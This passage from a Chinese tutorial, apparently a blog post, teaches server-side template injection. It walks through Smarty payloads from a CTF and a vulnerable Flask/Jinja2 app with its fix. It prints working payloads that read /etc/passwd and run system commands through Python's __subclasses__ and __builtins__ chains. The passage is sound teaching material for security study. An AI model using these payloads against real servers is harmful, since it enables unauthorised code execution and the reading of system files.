<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-DJ4a7s"><code-line class="line-numbers-rows"></code-line>&lt;script language="php"&gt;phpinfo();&lt;/script&gt;   </code-pre></pre>
</div>
<p>这个地方借助了<span style="background-color: rgba(255, 255, 153, 1)"> {literal}</span> 这个标签，因为<span style="background-color: rgba(255, 255, 153, 1)"> {literal}</span> 可以让一个模板区域的字符原样输出。&nbsp;这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。但是这种写法只适用于php5环境，这道ctf使用的是php7，所以依然失败</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200820233719367-1535357026.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200820233719367-1535357026.png" alt="" width="721" height="295" loading="lazy" class="medium-zoom-image"></a></p>
<p><strong>4.</strong>&nbsp;<strong>getstreamvariable</strong></p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-yQQQRn"><code-line class="line-numbers-rows"></code-line>{self::getStreamVariable("file:///etc/passwd")}</code-pre></pre>
</div>
<p>Smarty类的getStreamVariable方法的代码如下：</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-8NBBa5"><code-line class="line-numbers-rows"></code-line>public function getStreamVariable($variable)
<code-line class="line-numbers-rows"></code-line>{
<code-line class="line-numbers-rows"></code-line>        $_result = '';
<code-line class="line-numbers-rows"></code-line>        $fp = fopen($variable, 'r+');
<code-line class="line-numbers-rows"></code-line>        if ($fp) {
<code-line class="line-numbers-rows"></code-line>            while (!feof($fp) &amp;&amp; ($current_line = fgets($fp)) !== false) {
<code-line class="line-numbers-rows"></code-line>                $_result .= $current_line;
<code-line class="line-numbers-rows"></code-line>            }
<code-line class="line-numbers-rows"></code-line>            fclose($fp);
<code-line class="line-numbers-rows"></code-line>            return $_result;
<code-line class="line-numbers-rows"></code-line>        }
<code-line class="line-numbers-rows"></code-line>        $smarty = isset($this-&gt;smarty) ? $this-&gt;smarty : $this;
<code-line class="line-numbers-rows"></code-line>        if ($smarty-&gt;error_unassigned) {
<code-line class="line-numbers-rows"></code-line>            throw new SmartyException('Undefined stream variable "' . $variable . '"');
<code-line class="line-numbers-rows"></code-line>        } else {
<code-line class="line-numbers-rows"></code-line>            return null;
<code-line class="line-numbers-rows"></code-line>        }
<code-line class="line-numbers-rows"></code-line>    }</code-pre></pre>
</div>
<p>可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法。然而使用这个payload会触发报错如下：</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200820234305773-495371489.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200820234305773-495371489.png" alt="" width="758" height="226" loading="lazy" class="medium-zoom-image"></a></p>
<p>可见这个旧版本Smarty的SSTI利用方式并不适用于新版本的Smarty。而且在3.1.30的Smarty版本中官方已经把该静态方法删除。&nbsp;对于那些文章提到的利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。</p>
<p><strong>5. {if}{/if}</strong></p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-zKGDK7"><code-line class="line-numbers-rows"></code-line>{if phpinfo()}{/if}</code-pre></pre>
</div>
<p><span style="font-size: 14px">Smarty的<span style="background-color: rgba(255, 255, 153, 1)"> {if}</span> 条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||*，or，&amp;&amp;，and，is_array()等等，如：{if is_array($array)}{/if}*</span></p>
<p><span style="font-size: 14px">既然这样就将XFF头改为 {if phpinfo()}{/if} ：</span></p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200820234610811-341143885.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200820234610811-341143885.png" alt="" width="886" height="229" loading="lazy" class="medium-zoom-image"></a></p>
<p>同样还能用来执行一些系统命令：</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200820234755671-2008092498.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200820234755671-2008092498.png" alt="" width="826" height="321" loading="lazy" class="medium-zoom-image"></a></p>
<h3>CTF漏洞成因<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h3>
<p>本题中引发SSTI的代码简化后如下：</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-R27byy"><code-line class="line-numbers-rows"></code-line>&lt;?php
<code-line class="line-numbers-rows"></code-line>    require_once('./smarty/libs/' . 'Smarty.class.php');
<code-line class="line-numbers-rows"></code-line>    $smarty = new Smarty();
<code-line class="line-numbers-rows"></code-line>    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
<code-line class="line-numbers-rows"></code-line>    $smarty-&gt;display("string:".$ip);     // display函数把标签替换成对象的php变量；显示模板
<code-line class="line-numbers-rows"></code-line>}</code-pre></pre>
</div>
<p>可以看到这里使用字符串代替smarty模板，导致了注入的Smarty标签被直接解析执行，产生了SSTI。</p>
<h2>Blade<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h2>
<p>Blade 是 Laravel 提供的一个既简单又强大的模板引擎。</p>
<p>关于blade模板这里不再多说，请参考《<a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/sgm4231/p/10283661.html" rel="noopener">laravel Blade 模板引擎</a>》</p>
<h1>Python中的SSTI<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h1>
<p>python常见的模板有：Jinja2，tornado</p>
<h2>Jinja2<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h2>
<p><span style="font-size: 14px">Jinja2是一种面向Python的现代和设计友好的模板语言，它是以Django的模板为模型的</span></p>
<p><span style="font-size: 14px">Jinja2是Flask框架的一部分。Jinja2会把模板参数提供的相应的值替换了 {{…}} 块</span></p>
<p><span style="font-size: 14px">Jinja2使用<span style="background-color: rgba(255, 255, 153, 1)"> {{name}}</span>结构表示一个变量，它是一种特殊的占位符，告诉模版引擎这个位置的值从渲染模版时使用的数据中获取。</span></p>
<p><span style="font-size: 14px">Jinja2 模板同样支持控制语句，像在 {%…%} 块中，下面举一个常见的使用Jinja2模板引擎for语句循环渲染一组元素的例子：</span></p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-BsZJ73"><code-line class="line-numbers-rows"></code-line>&lt;ul&gt;
<code-line class="line-numbers-rows"></code-line>     {% for comment in comments %}
<code-line class="line-numbers-rows"></code-line>         &lt;li&gt;{{comment}}&lt;/li&gt;
<code-line class="line-numbers-rows"></code-line>     {% endfor %}
<code-line class="line-numbers-rows"></code-line>&lt;/ul&gt;</code-pre></pre>
</div>
<p><span style="font-size: 14px">另外Jinja2 能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。此外，还可使用过滤器修改变量，过滤器名添加在变量名之后，中间使用竖线分隔。例如，下述模板以首字母大写形式显示变量name的值。</span></p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-rk2GSm"><code-line class="line-numbers-rows"></code-line>Hello, {{name|capitalize}}</code-pre></pre>
</div>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200815153729779-1563757467.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200815153729779-1563757467.png" alt="" width="289" height="141" loading="lazy" class="medium-zoom-image"></a></p>
<p>这边使用vulhub提供的环境进行复现，搭建成功后访问首页如图：</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903130838384-1719222659.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903130838384-1719222659.png" alt="" width="359" height="68" loading="lazy" class="medium-zoom-image"></a></p>
<p>进入docker容器来看一下web代码：</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-S5PDnZ"><code-line class="line-numbers-rows"></code-line>from flask import Flask, request
<code-line class="line-numbers-rows"></code-line>from jinja2 import Template
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>app = Flask(__name__)
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>@app.route("/")
<code-line class="line-numbers-rows"></code-line>def index():
<code-line class="line-numbers-rows"></code-line>    name = request.args.get('name', 'guest')
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>    t = Template("Hello " + name)
<code-line class="line-numbers-rows"></code-line>    return t.render()
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>if __name__ == "__main__":
<code-line class="line-numbers-rows"></code-line>    app.run()</code-pre></pre>
</div>
<p><span style="background-color: rgba(255, 255, 153, 1)">t = Template("hello" + name)</span> 这行代码表示，将前端输入的name拼接到模板，此时name的输入没有经过任何检测，尝试使用模板语言测试：</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903130738597-1463882629.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903130738597-1463882629.png" alt="" width="401" height="70" loading="lazy" class="medium-zoom-image"></a></p>
<p>如果使用一个固定好了的模板，在模板渲染之后传入数据，就不存在模板注入，就好像SQL注入的预编译一样，修复上面代码如下：</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-f3c3da"><code-line class="line-numbers-rows"></code-line>from flask import Flask, request
<code-line class="line-numbers-rows"></code-line>from jinja2 import Template
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>app = Flask(__name__)
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>@app.route("/")
<code-line class="line-numbers-rows"></code-line>def index():
<code-line class="line-numbers-rows"></code-line>    name = request.args.get('name', 'guest')
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>    t = Template("Hello {{n}}")
<code-line class="line-numbers-rows"></code-line>    return t.render(n=name)
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>if __name__ == "__main__":
<code-line class="line-numbers-rows"></code-line>    app.run()</code-pre></pre>
</div>
<p>编译运行，再次注入就会失败</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903151308616-823367288.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903151308616-823367288.png" alt="" width="439" height="86" loading="lazy" class="medium-zoom-image"></a></p>
<p>由于在jinja2中是可以直接访问python的一些对象及其方法的，所以可以通过构造继承链来执行一些操作，比如文件读取，命令执行等：</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-J6jjM2"><code-line class="line-numbers-rows"></code-line>__dict__　　 ：保存类实例或对象实例的属性变量键值对字典
<code-line class="line-numbers-rows"></code-line>__class__　　：返回一个实例所属的类
<code-line class="line-numbers-rows"></code-line>__mro__　　  ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
<code-line class="line-numbers-rows"></code-line>__bases__　　：以元组形式返回一个类直接所继承的类（可以理解为直接父类）__base__　　 ：和上面的bases大概相同，都是返回当前类所继承的类，即基类，区别是base返回单个，bases返回是元组
<code-line class="line-numbers-rows"></code-line>// __base__和__mro__都是用来寻找基类的
<code-line class="line-numbers-rows"></code-line>__subclasses__　　：以列表返回类的子类
<code-line class="line-numbers-rows"></code-line>__init__　　 ：类的初始化方法
<code-line class="line-numbers-rows"></code-line>__globals__　　   ：对包含函数全局变量的字典的引用__builtin__&amp;&amp;__builtins__　　：python中可以直接运行一些函数，例如int()，list()等等。　　　　　　　　　　　　　　　　　　这些函数可以在__builtin__可以查到。查看的方法是dir(__builtins__)　　　　　　　　　　　　　　　　　　在py3中__builtin__被换成了builtin　　　　　　　　　　　　　　　　　　1.在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__。　　　　　　　　　　　　　　　　　　2.非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身</code-pre></pre>
</div>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200815153729779-1563757467.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200815153729779-1563757467.png" alt="" width="289" height="141" loading="lazy" class="medium-zoom-image"></a></p>
<h3>用file对象来读取文件<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h3>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-Y5kRhY"><code-line class="line-numbers-rows"></code-line>for c in {}.__class__.__base__.__subclasses__():
<code-line class="line-numbers-rows"></code-line>    if(c.__name__=='file'):
<code-line class="line-numbers-rows"></code-line>        print(c)
<code-line class="line-numbers-rows"></code-line>        print c('joker.txt').readlines()</code-pre></pre>
</div>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903153121082-520901024.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903153121082-520901024.png" alt="" width="384" height="215" loading="lazy" class="medium-zoom-image"></a></p>
<p><span style="font-size: 14px">上述代码先通过<span style="background-color: rgba(255, 255, 153, 1)">__class__</span>获取字典对象所属的类，再通过<span style="background-color: rgba(255, 255, 153, 1)">__base__（__bases[0]__）<span style="background-color: rgba(255, 255, 255, 1)">拿到基类，然后使用<span style="background-color: rgba(255, 255, 153, 1)">__subclasses__()</span>获取子类列表，在子类列表中直接寻找可以利用的类</span></span></span></p>
<p><span style="font-size: 14px">为了方便理解，我直接把获取到的子类列表打印出来：</span></p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-TGdXca"><code-line class="line-numbers-rows"></code-line>for c in {}.__class__.__base__.__subclasses__():
<code-line class="line-numbers-rows"></code-line>        print(c) </code-pre></pre>
</div>
<p>&nbsp;打印结果如下（python2.7.5）：</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-RTPcYM"><code-line class="line-numbers-rows"></code-line>&lt;type 'type'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'weakref'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'weakcallableproxy'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'weakproxy'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'int'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'basestring'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'bytearray'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'list'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'NoneType'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'NotImplementedType'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'traceback'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'super'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'xrange'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'dict'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'set'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'slice'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'staticmethod'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'complex'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'float'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'buffer'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'long'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'frozenset'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'property'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'memoryview'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'tuple'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'enumerate'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'reversed'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'code'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'frame'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'builtin_function_or_method'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'instancemethod'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'function'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'classobj'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'dictproxy'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'generator'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'getset_descriptor'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'wrapper_descriptor'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'instance'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'ellipsis'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'member_descriptor'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'file'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'PyCapsule'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'cell'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'callable-iterator'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'iterator'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'sys.long_info'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'sys.float_info'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'EncodingMap'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'fieldnameiterator'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'formatteriterator'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'sys.version_info'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'sys.flags'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'exceptions.BaseException'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'module'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'imp.NullImporter'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'zipimport.zipimporter'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'posix.stat_result'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'posix.statvfs_result'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;class 'warnings.WarningMessage'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;class 'warnings.catch_warnings'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;class '_weakrefset._IterationGuard'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;class '_weakrefset.WeakSet'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;class '_abcoll.Hashable'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type 'classmethod'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;class '_abcoll.Iterable'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;class '_abcoll.Sized'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;class '_abcoll.Container'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;class '_abcoll.Callable'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;class 'site._Printer'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;class 'site._Helper'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type '_sre.SRE_Pattern'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type '_sre.SRE_Match'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;type '_sre.SRE_Scanner'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;class 'site.Quitter'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;class 'codecs.IncrementalEncoder'&gt;
<code-line class="line-numbers-rows"></code-line>&lt;class 'codecs.IncrementalDecoder'&gt;</code-pre></pre>
</div>
<p>使用dir来看一下file这个子类的内置方法：</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-5P8mC8"><code-line class="line-numbers-rows"></code-line>dir(().__class__.__bases__[0].__subclasses__()[40])</code-pre></pre>
</div>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903162108171-343241811.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903162108171-343241811.png" alt="" width="609" height="112" loading="lazy" class="medium-zoom-image"></a></p>
<p>将要读取的文件传进入并使用readlines()方法读取，就相当于：</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-RaBzNR"><code-line class="line-numbers-rows"></code-line>file('joker.txt').readlines()</code-pre></pre>
</div>
<p>可以在python交互终端中尝试输出：</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903185622152-2036123666.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903185622152-2036123666.png" alt="" width="610" height="249" loading="lazy" class="medium-zoom-image"></a></p>
<p>再使用jinja2的语法封装成可解析的样子：</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-yEKTxy"><code-line class="line-numbers-rows"></code-line>{% for c in [].__class__.__base__.__subclasses__() %}
<code-line class="line-numbers-rows"></code-line>{% if c.__name__=='file' %}
<code-line class="line-numbers-rows"></code-line>{{ c("/etc/passwd").readlines() }}
<code-line class="line-numbers-rows"></code-line>{% endif %}
<code-line class="line-numbers-rows"></code-line>{% endfor %}</code-pre></pre>
</div>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903162635283-101719007.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903162635283-101719007.png" alt="" width="679" height="253" loading="lazy" class="medium-zoom-image"></a></p>
<p>不过我这边一直没有读取成功，原因是：<span style="color: rgba(255, 0, 0, 1)"><strong>python3已经移除了file。所以利用file子类文件读取只能在python2中用。</strong></span></p>
<p><span style="color: rgba(0, 0, 0, 1)">docker容器默认使用python3版本</span></p>
<p><span style="color: rgba(0, 0, 0, 1)"><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903163434739-57279547.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903163434739-57279547.png" alt="" width="413" height="84" loading="lazy" class="medium-zoom-image"></a></span></p>
<h3>用内置模块执行命令<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h3>
<p>上面的实例中我们使用dir把内置的对象列举出来，其实可以用<span style="background-color: rgba(255, 255, 153, 1)">__globals__</span>更深入的去看每个类可以调用的东西（包括模块，类，变量等等），如果有os这种可以直接传入命令，造成命令执行</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-Xb8K85"><code-line class="line-numbers-rows"></code-line>#coding:utf-8search = 'os'   #也可以是其他你想利用的模块
<code-line class="line-numbers-rows"></code-line>num = -1
<code-line class="line-numbers-rows"></code-line>for i in ().__class__.__bases__[0].__subclasses__():
<code-line class="line-numbers-rows"></code-line>    num += 1
<code-line class="line-numbers-rows"></code-line>    try:
<code-line class="line-numbers-rows"></code-line>        if search in i.__init__.__globals__.keys():
<code-line class="line-numbers-rows"></code-line>            print(i, num)
<code-line class="line-numbers-rows"></code-line>    except:
<code-line class="line-numbers-rows"></code-line>        pass </code-pre></pre>
</div>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903164854386-1155449135.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903164854386-1155449135.png" alt="" width="597" height="146" loading="lazy" class="medium-zoom-image"></a></p>
<p>可以看到在元组68，73的位置找到了os方法，这样就可以构造命令执行payload:</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-JMHMQQ"><code-line class="line-numbers-rows"></code-line>().__class__.__bases__[0].__subclasses__()[68].__init__.__globals__['os'].system('whoami')
<code-line class="line-numbers-rows"></code-line>().__class__.__base__.__subclasses__()[73].__init__.__globals__['os'].system('whoami')
<code-line class="line-numbers-rows"></code-line>().__class__.__mro__[1].__subclasses__()[68].__init__.__globals__['os'].system('whoami')
<code-line class="line-numbers-rows"></code-line>().__class__.__mro__[1].__subclasses__()[73].__init__.__globals__['os'].system('whoami')</code-pre></pre>
</div>
<p>在python交互终端中尝试输出：</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903185803928-864364882.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903185803928-864364882.png" alt="" width="600" height="203" loading="lazy" class="medium-zoom-image"></a></p>
<p><span style="color: rgba(255, 0, 0, 1)"><strong>不过同样，只能在python2版本使用</strong></span></p>
<p>这时候就要推荐__builtins__：</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-GAMQfp"><code-line class="line-numbers-rows"></code-line>#coding:utf-8
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>search = '__builtins__'
<code-line class="line-numbers-rows"></code-line>num = -1
<code-line class="line-numbers-rows"></code-line>for i in ().__class__.__bases__[0].__subclasses__():
<code-line class="line-numbers-rows"></code-line>    num += 1
<code-line class="line-numbers-rows"></code-line>    try:
<code-line class="line-numbers-rows"></code-line>        print(i.__init__.__globals__.keys())
<code-line class="line-numbers-rows"></code-line>        if search in i.__init__.__globals__.keys():
<code-line class="line-numbers-rows"></code-line>            print(i, num)
<code-line class="line-numbers-rows"></code-line>    except:
<code-line class="line-numbers-rows"></code-line>        pass</code-pre></pre>
</div>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903193619159-1700547757.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903193619159-1700547757.png" alt="" width="630" height="148" loading="lazy" class="medium-zoom-image"></a></p>
<p>这时候我们的命令执行payload就出来了：<br>python3：</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-mceTZd"><code-line class="line-numbers-rows"></code-line>().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")</code-pre></pre>
</div>
<p>python2：</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-MD54Qp"><code-line class="line-numbers-rows"></code-line>().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")</code-pre></pre>
</div>
<p>在python交互终端中尝试输出：</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903193824030-649565108.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903193824030-649565108.png" alt="" width="648" height="104" loading="lazy" class="medium-zoom-image"></a></p>
<p>实际注入效果：</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903194150593-332610088.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200903194150593-332610088.png" alt="" width="795" height="176" loading="lazy" class="medium-zoom-image"></a></p>
